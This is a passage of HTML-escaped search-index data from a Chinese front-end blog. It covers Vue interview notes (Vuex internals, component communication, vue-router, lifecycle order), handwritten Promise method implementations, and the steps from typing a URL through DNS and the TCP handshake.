4.组件中使用时
// App.vue
add(){
    this.$store.commit(&#39;increment&#39;);
},
asyncAdd(){
    this.$store.dispatch(&#39;asyncAdd&#39;);
}

&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h3 id=&#34;实现&#34;&gt;实现&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let Vue

class Store{
    constructor(options){
       let { state, getters, actions, mutations } = options
    }
}

const install=function(_Vue){
    Vue=_Vue
    //使用Vue的混入方法
    Vue.mixin({
        beforeCreat(){
            //根实例有store属性
            if(this.$options &amp;amp;&amp;amp; this.$options.store)
            {
                this.$store=this.$options.store
            }
            else{
            	//根实例没有store实例，往父节点找
                new Vue({store})
                this.$store=this.$parent &amp;amp;&amp;amp; this.$parent.$store
            }
        }
    })
}

export default install
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;beforeCreate&lt;/code&gt;中，第一次根组件通过&lt;code&gt;store&lt;/code&gt;属性挂载&lt;code&gt;$store&lt;/code&gt;，后面子组件调用&lt;code&gt;beforeCreate&lt;/code&gt;挂载的&lt;code&gt;$store&lt;/code&gt;都会向上找到父级的&lt;code&gt;$store&lt;/code&gt;，这样子通过层层向上寻找，让每个组件都挂上了一个&lt;code&gt;$store&lt;/code&gt;属性，而这个属性的值就是我们的&lt;code&gt;new Store({...})&lt;/code&gt;的实例。如下图&lt;/p&gt;
&lt;img src=&#34;https://image-static.segmentfault.com/243/426/2434268944-5c77b5165815e_fix732&#34;&gt;
&lt;h3 id=&#34;设置state响应数据&#34;&gt;设置state响应数据&lt;/h3&gt;
&lt;p&gt;通过创建vue实例来实现双向绑定&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;class Store{
    constructor(options){
        let {state,getters,mutations,actions}=options
        this.getters = {}
   		this.mutations = {}
    	this.actions = {}
    }
    // vuex的核心就是借用vue的实例，因为vuex的数据更改回更新视图
    this._vm=new Vue({
        data:{
            state
        }
    })
}

 // 访问state对象时候，就直接返回响应式的数据
  get state() { // Object.defineProperty get 同理
    return this._vm.state
  }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;组件中的通信&#34;&gt;组件中的通信&lt;/h2&gt;
&lt;h3 id=&#34;vue-bus&#34;&gt;vue bus&lt;/h3&gt;
&lt;p&gt;通过注册一个Vue对象，其他组件通过这个中间商传递信息&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;import Vue from &#39;vue&#39;
const bus = new Vue()
export default bus 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;组件发送消息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;import bus from &#39;@/utils/bus&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bus.$emit(&#39;message&#39;, &#39;hello&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;组件接收消息&lt;/p&gt;
&lt;p&gt;&lt;code&gt;import bus from &#39;@/utils/bus&#39;&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-tsx&#34;&gt;bus.$on(&#39;message&#39;, (e) =&amp;gt; {
    console.log(e)
})
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;vuex-2&#34;&gt;Vuex&lt;/h3&gt;
&lt;p&gt;通过组件共享的store来实现全局共享&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.$store.state.xxx&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;props和emit&#34;&gt;&lt;code&gt;props&lt;/code&gt;和&lt;code&gt;emit&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;父&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div&amp;gt;
	&amp;lt;child :message=&amp;quot;message&amp;quot; @changemessage=&amp;quot;handlechild&amp;quot;&amp;gt;&amp;lt;/child&amp;gt;
&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
	expore default{
    	data(){
            message:&#39;fanfan&#39;,
        },
        
        methods:{
            handlechild(){
                ...
            }
        }
    }
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;孩子&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;div&amp;gt;
    {{message}}
&amp;lt;/div&amp;gt;

&amp;lt;script&amp;gt;
	expore default{
    props:{
        message:String
    },
    	data(){
            message:&#39;fanfan&#39;,
        },
        
        methods:{
            somemethods(){
                this.$emit(&#39;changemessage&#39;,this.messgae)
            }
        }
    }
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用更加简洁的写法&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;child :message.sync=&amp;quot;message&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;this.$emit(&#39;update:message&#39;,this.message)&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;attrs和listeners&#34;&gt;&lt;strong&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;和&lt;/mi&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;attrs**和**&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.61508em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;和&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.46528em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∗&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;listeners&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;经常用于多层嵌套&lt;/p&gt;
&lt;p&gt;&lt;code&gt;attrs&lt;/code&gt;：包含的是父域中未被&lt;code&gt;props&lt;/code&gt;识别的特性属性。通过&lt;code&gt;v-bind=&amp;quot;$attrs&amp;quot;&lt;/code&gt;传入下一个子组件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;listeners&lt;/code&gt;： 	包含了父作用域中的 (不含 &lt;code&gt;.native&lt;/code&gt; 修饰器的) &lt;code&gt;v-on&lt;/code&gt; 事件监听器。它可以通过 &lt;code&gt;v-on=&amp;quot;$listeners&amp;quot;&lt;/code&gt; 传入内部组件存储的父实例传入的方法（存放的是父组件中绑定的非原生事件）&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;provide和inject&#34;&gt;provide和inject&lt;/h3&gt;
&lt;p&gt;向子孙后代注入一个依赖。&lt;/p&gt;
&lt;p&gt;祖先通过&lt;code&gt;provide&lt;/code&gt;提供变量，然后在子孙组件通过&lt;code&gt;inject&lt;/code&gt;来注入变量。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 父级组件提供 &#39;foo&#39;
var Provider = {
  provide: {
    foo: &#39;bar&#39;
  },
  // ...
}

// 子组件注入 &#39;foo&#39;
var Child = {
  inject: [&#39;foo&#39;],
  created () {
    console.log(this.foo) // =&amp;gt; &amp;quot;bar&amp;quot;
  }
  // ...
}


//`inject`也可以有默认项
const Child = {
  inject: {
    foo: { default: &#39;foo&#39; }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但需要注意的是 &lt;strong&gt;provide和inject的绑定并不是响应式的。如果传入的是可监听的对象，那么其对象还是可响应的。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var privider={
    provide:{
        name:&#39;fan&#39;
    }
}

var child={
    inject:[&#39;name&#39;],
    created(){
        console.log(this.name)
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果这个父组件的name改变了，子组件的name还是不会变的。&lt;/p&gt;
&lt;p&gt;当然我们可以直接提供祖先实例，这样对子孙组件对祖先的修改也会直接响应。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var provider={
    provide(){
        return{
            myfather:this //注入祖先实例
        }
    }
}


var child={
    inject:{
        myfather:{
            default:()=&amp;gt;({})
        }
    },
    
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样带来的不便就是将多余的方法等不需要的东西也挂载了。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;当然也可以用&lt;code&gt;Vue.observable&lt;/code&gt;这个API来实现，它是让一个对象可响应，用于组件状态的共享。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var provider={
    data(){
        return {
            myobj:{}
        }
    },
    provide(){
        this.myobj=Vue.Observable({
            name:&#39;fan&#39;,
            age:&#39;20&#39;
        })
        
        return this.myobj
    }
}


var child={
    inject:{
        myobj:{
            default:()=&amp;gt;({})
        }
    },
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h3 id=&#34;parent-children和ref&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;、&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;parent、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.80952em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;children和$ref&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;My-Comp ref=&amp;quot;myref&amp;quot;&amp;gt;&amp;lt;/My-Comp&amp;gt;

//直接获得子组件的实例
this.$ref.myref.xxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不建议频繁使用&lt;code&gt;$parent、$children&lt;/code&gt;&lt;/p&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h2 id=&#34;vue-router&#34;&gt;vue-router&lt;/h2&gt;
&lt;p&gt;更新视图而不更新页面，是路由实现的核心功能&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HashHistory&lt;/code&gt; 、&lt;code&gt;HTML5History&lt;/code&gt;、&lt;code&gt;AbstratHistory&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;主要是靠以下两种方法实现&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;HashHistory&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;hash 虽然出现在 url 中，但不会被包括在 http 请求中，它是用来指导浏览器动作的，对服务器端完全无用，因此，改变 hash &lt;strong&gt;不会重新加载页面&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;给hash添加监听事件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;　window.addEventListener(&amp;quot;hashchange&amp;quot;,function(){},false)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;HashHistory.push()&lt;/code&gt;、&lt;code&gt;HashHistory.replace()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;第一个是将新路由推入浏览器访问历史的栈顶&lt;/p&gt;
&lt;p&gt;第二个只替换当前路由，而不记录&lt;/p&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;HashHistory&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;back()&lt;/code&gt;,&lt;code&gt;forward()&lt;/code&gt;,&lt;code&gt;go()&lt;/code&gt;等方法，我们可以读取浏览器历史记录栈的信息，进行各种跳转操作。&lt;/p&gt;
&lt;p&gt;从&lt;code&gt;HTML5&lt;/code&gt;开始，&lt;code&gt;History interface&lt;/code&gt;提供了2个新的方法：&lt;code&gt;pushState()&lt;/code&gt;,&lt;code&gt;replaceState()&lt;/code&gt;使得我们可以对浏览器历史记录栈进行修改：这&lt;code&gt;2&lt;/code&gt;个方法有个共同的特点：当调用他们修改浏览器历史栈后，虽然当前&lt;code&gt;url&lt;/code&gt;改变了，&lt;strong&gt;但浏览器不会立即发送请求该&lt;code&gt;url&lt;/code&gt;，这就为单页应用前端路由，更新视图但不重新请求页面提供了基础&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;HTML5History&lt;/code&gt;中添加对修改浏览器地址栏&lt;code&gt;URL&lt;/code&gt;的监听**&lt;code&gt;popstate&lt;/code&gt;**是直接在构造函数中执行的：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;app&amp;quot;&amp;gt;
    &amp;lt;a href=&amp;quot;#foo&amp;quot;&amp;gt;foo&amp;lt;/a&amp;gt;
    &amp;lt;a href=&amp;quot;#bar&amp;quot;&amp;gt;bar&amp;lt;/a&amp;gt;

    &amp;lt;/div&amp;gt;

&amp;lt;/body&amp;gt;


&amp;lt;script src=&amp;quot;https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;script&amp;gt;

const foo={template:`&amp;lt;div&amp;gt; foo&amp;lt;/div&amp;gt;`}
const bar={template:`&amp;lt;div&amp;gt; bar&amp;lt;/div&amp;gt;`}
const mydefault={template:`&amp;lt;div&amp;gt;mydefault&amp;lt;/div&amp;gt;`}

const routetable={
    &#39;foo&#39;:foo,
    &#39;bar&#39;:bar,
    &#39;&#39;:mydefault,
}

const app=new Vue({
    el:&#39;#app&#39;,
    data:{
         url:window.location.hash.slice(1)
    },
  
    render(h) {
        return h(&#39;div&#39;,[
            h(routetable[this.url]),
            h(&#39;a&#39;,{attrs:{href:&#39;#foo&#39;}},&#39;foo&#39;),
            &#39; | &#39;,
            h(&#39;a&#39;,{attrs:{href:&#39;#bar&#39;}},&#39;bar&#39;)
           ])
    },
})

window.addEventListener(&#39;hashchange&#39;,()=&amp;gt;{
    app.url=window.location.hash.slice(1)
})


&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000014822765&#34;&gt;源码解析&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;父子组件生命周期顺序&#34;&gt;父子组件生命周期顺序&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt;父beforeCreate -&amp;gt; 父created -&amp;gt; 父beforeMount&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;**-&amp;gt;&lt;strong&gt;子beforeCreate -&amp;gt; 子created -&amp;gt; 子beforeMount -&amp;gt; 子mounted&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt; 父mounted&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;子组件更新过程&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt;父beforeUpdate&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt; 子beforeUpdate -&amp;gt; 子updated&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt; 父updated&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;父组件更新过程&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;父beforeUpdate -&amp;gt; 父updated&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;销毁过程&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-&amp;gt; 父 beforeDestory&lt;/p&gt;
&lt;p&gt;-&amp;gt; 子 beforeDestory -&amp;gt; 子 destoryed&lt;/p&gt;
&lt;p&gt;-&amp;gt; 父 destoryed&lt;/p&gt;
&lt;/blockquote&gt;
">vue面试题</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/promise-fang-fa-shou-xie-da-fa/"" data-c="
          &lt;h2 id=&#34;promiseresolve&#34;&gt;Promise.resolve()&lt;/h2&gt;
&lt;p&gt;将现有对象转为 Promise 对象&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Promise.resolve(&#39;foo&#39;)
// 等价于
new Promise(resolve =&amp;gt; resolve(&#39;foo&#39;))
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  Promise.resolve = function (res) {
          return new Promise((res) =&amp;gt; {
              resolve(res)
          })
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseprototypecatch&#34;&gt;Promise.prototype.catch&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  Promise.prototype.catch = function (fn) {
          return this.then(null, fn)
      }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseprototypefinally&#34;&gt;Promise.prototype.finally&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;finally()&lt;/code&gt;方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。&lt;/p&gt;
&lt;p&gt;且不能传递参数，所以无法获取这个实例的状态。但还要返回这个状态结果。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt; Promise.prototype.finally=function(onFinished){
 		return this.then((result)=&amp;gt;{
            onFinished()
            return result
        }).catch((e)=&amp;gt;{
 			onFinished()
            return e
        })
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseall&#34;&gt;Promise.all()&lt;/h2&gt;
&lt;p&gt;返回Promise实例，接收参数为一个数组，当有不是Promise的实例的时候，会调用Promise.resolve方法转化。&lt;/p&gt;
&lt;p&gt;返回第一个被reject的实例给回调函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Promise.all = function (promises) {
        let results  = []
        let promiseCount = 0;
        let promisesLength = promises.length;
        return new Promise((resolve, reject) =&amp;gt; {
            for (let val of promises) {
                Promise.resolve(val).then(function (res) {

                    results[promiseCount] = res;
                    promiseCount++;
                    // 当所有函数都正确执行了，resolve输出所有返回结果。
                    if (promiseCount === promisesLength) {
                        return resolve(results);
                    }

                }, function (err) {
                    return reject(err);
                });
            }
        })
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseany&#34;&gt;Promise.any&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  //Promise.any 和all相反 所有都rejected时候返回 AggregateError: All promises were rejected
    Promise.any=function(promises){
        let errorcount=0
        let promiselength=promises.length

        return new Promise((resolve,reject)=&amp;gt;{
            for(let val of promises){
                Promise.resolve(val).then(function(res){
                        return resolve(res)
                },function(e){
                    errorcount++
                    //所有都reject的话 返回这个错误
                    if(errorcount===promiselength)
                    {  
                        return reject(new AggregateError(&#39;All promises were rejected&#39;))
                    }
                   
                })
            }
        })
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiserace&#34;&gt;Promise.race&lt;/h2&gt;
&lt;p&gt;传入一个数组。竞争关系，返回第一个完成的实例。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;    //promise.race
    Promise.race=function(promises){

        return new Promise ((resolv,reject)=&amp;gt;{
            for(let val of promises){
                return Promise.resolve(val).then(function(res){
                        return resolv(res)
                },function(e){
                        return reject(e)
                })
            }
        })
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;promiseallsettled&#34;&gt;Promise.allSettled&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;Promise.allSettled=function(promises){
        let allresult=[]
        let count=0
        let promiselength=promises.length

        return new Promise((resolve,reject)=&amp;gt;{
                for(let val of promises){
                    Promise.resolve(val).then(function(res){
                        allresult[count]={state:&#39;fulfilled&#39;, value:res};
                        count++
                    },function(e){
                        allresult[count]={state:&#39;rejected&#39;, value:e};
                        count++
                    }).finally(()=&amp;gt;{
                        if(promiselength==count)
                        resolve(allresult);
                    })
                }
        })
    }
&lt;/code&gt;&lt;/pre&gt;
"> Promise方法手写大法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/zi-wo-zong-jie-dang-di-zhi-lan-shu-ru-yi-ge-url-hui-fa-sheng-shi-me/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1631790712077.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;配合这张图来捋清楚&lt;/p&gt;
&lt;h2 id=&#34;键入url的过程&#34;&gt;键入URL的过程&lt;/h2&gt;
&lt;p&gt;最开始输入ULR后浏览器会判断我们输入的是 &lt;strong&gt;搜索内容&lt;/strong&gt;还是 &lt;strong&gt;请求的URL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果是内容的话就会根据我们内容去形成新的URL去搜索&lt;/p&gt;
&lt;p&gt;如果是符合URL规则的话就会进行下一步（浏览器会自动补齐这个网站的协议）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;浏览器加载一个地址之后，页面不会马上跳转，但标签页的图标变成了加载的标志，因为需要等待提交文档的阶段，页面内容才会被替换。&lt;/strong&gt;&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;url请求的过程&#34;&gt;URL请求的过程&lt;/h2&gt;
&lt;p&gt;下一步进入页面请求资源的过程。&lt;/p&gt;
&lt;p&gt;我们知道浏览器是被分为 &lt;strong&gt;浏览器内核&lt;/strong&gt;（浏览器进程、网络进程、GPU）和 &lt;strong&gt;渲染内核&lt;/strong&gt;（渲染进程）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;分模块的目的也是为了稳定性和安全性。&lt;/p&gt;
&lt;p&gt;单核浏览器的时候一个文件很容易造成整个进程的崩溃&lt;/p&gt;
&lt;p&gt;对于网络请求、下载也都是浏览器内核进行下载资源后和渲染进程进行通信转发的。&lt;/p&gt;
&lt;p&gt;然后渲染进程会对这些资源进⾏解析、绘制等操作，最终⽣成⼀ 幅图⽚。但是渲染进程并不负责将图⽚显⽰到界⾯上，⽽是将最终⽣成的图⽚提交给浏览器内核模块，由浏 览器内核模块负责显⽰这张图⽚。&lt;/p&gt;
&lt;p&gt;目的也是 &lt;strong&gt;防止渲染进程直接对操作系统进行访问&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这时，浏览器进程会通过进程间通信把URL请求发送给网络进程，网络进程收到URL后，才会发起真正的URL请求流程。&lt;/p&gt;
&lt;p&gt;当真正发起请求的的时候，网络进程会先查找本地是否缓存了该资源。&lt;/p&gt;
&lt;p&gt;如果存在就返回给浏览器进程。&lt;/p&gt;
&lt;p&gt;如果没有进入网络请求流程。&lt;/p&gt;
&lt;p&gt;在请求前的第一步是进行&lt;a href=&#34;https://jingyan.baidu.com/article/86fae346e9d33e3c49121acb.html&#34;&gt;DNS解析&lt;/a&gt;（点击查看详细流程），DNS有缓存则直接返回域名的服务器IP地址。如果是HTTPS协议 （&lt;a href=&#34;https://fanfankill.github.io/post/httpsrang-shu-ju-chuan-shu-geng-an-quan/&#34;&gt;什么是HTTPS&lt;/a&gt;），则还需要建立TLS连接&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;tcp连接&#34;&gt;TCP连接&lt;/h2&gt;
&lt;p&gt;TCP位于传输层，从上往下 HTTP-&amp;gt;TCP-&amp;gt;IP，每一层都会封装自己的头部信息。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TCP和UDP的区别&lt;/p&gt;
&lt;p&gt;TCP保证了传输的可靠性（重传机制 ），并且TCP引入了数据包排序机制，用来保证把乱序的数据包合成一个完整的文件。&lt;/p&gt;
&lt;p&gt;虽然UDP不保证可靠性，但它的传输速度却很快。&lt;/p&gt;
&lt;p&gt;TCP的拥塞控制：慢启动、拥塞窗口控制、快重传机制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;第一次：客户端会先给服务器发送SYN=1标志码，代表要建立连接&lt;/p&gt;
&lt;p&gt;第二次：服务器收到消息后会返回 ACK=1/SYN=1 代表可以建立连接&lt;/p&gt;
&lt;p&gt;第三次：客户端发送ACK=1给服务器来完成TCP连接的建立。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	TCP握手为什么是三次？&lt;/p&gt;
&lt;p&gt;为了保证数据传输的可靠性，三次握手的过程即是告知双发序列号起始值，并且确定对方收到了序列号起始值的步骤&lt;/p&gt;
&lt;p&gt;如果只有两次，那么只有一方序列号能够得到确认&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于不同HTTP版本的介绍&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/http1http-xing-neng-you-hua/&#34;&gt;HTTP1.0 /1.1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/http2ru-he-ti-sheng-luo-su-du/&#34;&gt;HTTP 2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://fanfankill.github.io/post/http3shuai-diao-tcptls-de-bao-fu-gou-jian-xiao-luo/&#34;&gt;HTTP 3&lt;/a&gt;&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;我们用的HTTP/1.1，谷歌最多可以建立6个TCP的连接，多余的TCP也需要排队等候。默认是持久连接。&lt;/p&gt;
&lt;p&gt;完成TCP连接建立后，浏览器端会构建请求⾏、请求头等信息，并 把和该域名相关的Cookie等数据附加到请求头中，然后向服务器发送构建的请求信息。&lt;/p&gt;
&lt;p&gt;服务器接收到请求信息后，会根据请求信息⽣成响应数据（包括响应⾏、响应头和响应体等信息），并发给 ⽹络进程。等⽹络进程接收了响应⾏和响应头之后，就开始解析响应头的内容了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;​	网络进程对返回的响应头的解析：&lt;/p&gt;
